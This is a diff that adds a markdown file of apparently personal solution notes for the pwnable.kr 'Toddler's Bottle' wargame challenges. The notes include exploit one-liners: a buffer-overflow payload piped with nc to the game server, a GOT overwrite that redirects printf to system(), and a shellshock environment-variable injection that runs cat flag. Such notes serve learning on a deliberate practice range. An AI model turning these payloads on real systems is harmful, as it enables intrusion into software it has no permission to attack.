@@ -1,0 +1,60 @@
+# pwnable.kr
+
+# Toddler's Bottle
+* fd
+* collision
+* bof 
+overflow local var to overwrite function argument (32b)
+create pattern
+pattern offset AAGA..
+(python -c 'print "A"*52+"\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
+
+* flag
+strings -> upx packed
+upx -d flag -o flag_upx
+
+* passcode
+vuln scanf in login() being passed the local int var not its address
+we can fill local var of welcome() with 'A'*96+'\x04\xa0\x04\x08' so that 4-byte addr will be the value of the uninitialized local var in login()
+we can overwrite address of plt@printf with the address of the system() call that's a couple of lines below
+more info: https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html
+
+$ readelf -a passcode
+...
+Relocation section '.rel.plt' at offset 0x398 contains 9 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+0804a000  00000107 R_386_JUMP_SLOT   00000000   printf
+0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush
+
+gef> disass login
+...
+   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
+   0x080485ea <+134>:   call   0x8048460 <system@plt>
+
+$ python -c "print 'A'*96+'\x04\xa0\x04\x08' + '%d\n' % 0x80485e3" | ./passcode | xxd
+00000000: 776f 6f74 0a54 6f64 646c 6572 2773 2053  woot.Toddler's S
+
+* random
+calls rand() without calling srand(), as a result rand() is automatically seeded with a value of 1 and first returned value will always be 1804289383
+
+* input
+https://werewblog.wordpress.com/2016/01/11/pwnable-kr-input/
+
+* leg
+ARMv5
+In key1, mov r3, pc; mov r0, r3; will set r0 to 0x00008cdc + 8 (In arm mode pc will save current place + 8)
+In key2, add r6, pc, #1; bx r6; will switch to thumb mode. mov r3, pc; adds r3, #4; mov r0, r3; will set r0 to 0x00008d04 + 4 + 4 (In thumb mode pc will save the current place + 4)
+In key3 it will return lr, which is the return address
+
+0x8ce4 + 0x8d0c + 0x8d80 = 108400
+ 
+* mistake
+fd = open("...",O_RDONLY,0400) < 0 is equivalent to fd = (open("...",O_RDONLY,0400) < 0)
+we just input two 10-char passwords, one of which is xor of the other one
+$ echo -e 'ccccbbbbee\nbbbbccccdd' | ./mistake                                                                                                                                                                                 
+do not bruteforce...
+input password : Password OK
+Mommy, the operator priority always confuses me :(
+
+* shellshock
+LOL='() { :;};cat flag' ./shellshock
